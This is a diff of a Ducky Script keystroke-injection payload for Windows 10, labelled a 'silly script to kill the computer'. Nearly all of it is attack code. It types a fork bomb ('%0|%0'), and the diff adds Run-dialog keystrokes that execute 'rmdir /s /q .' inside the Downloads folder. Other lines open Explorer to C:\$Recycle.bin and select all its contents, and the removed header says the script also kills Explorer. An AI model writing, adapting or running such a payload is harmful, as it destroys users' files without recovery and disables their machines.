@@ -1,7 +1,4 @@
-REM Target-OS: Windows 10
-REM Title: Deadly script to kill windows (If you're using windows, you kinda deserve this)
-REM Author: Zek-C
-REM Description: Deletes everything in the downloads directory, removes it all from the recycle bin, then fork bombs and kills the explorer.
+REM silly script to kill the computer :lol:
 DELAY 100
 REM ---------------------------------------------------------------------------------------------------------------------------------
 REM fork bomb!11!!!
@@ -10,18 +7,16 @@ STRING %0|%0
 REM ---------------------------------------------------------------------------------------------------------------------------------
 REM goodbye files
 REM ---------------------------------------------------------------------------------------------------------------------------------
+GUI r
+DELAY 250
+STRING cd Downloads
+DELAY 1
+STRING rmdir /s /q .
+DELAY 125
+ALT F4
+DELAY 25
 WINDOWS e
-DELAY 100
-CTRL l
-STRING C:\Users\
-TAB
-DELAY 50
-STRING \Downloads
-DELAY 70
-CTRL a
-DELAY 10
-DELETE
-DELAY 100
+DELAY 75
 CTRL l
 STRING C:\$Recycle.bin
 CTRL a
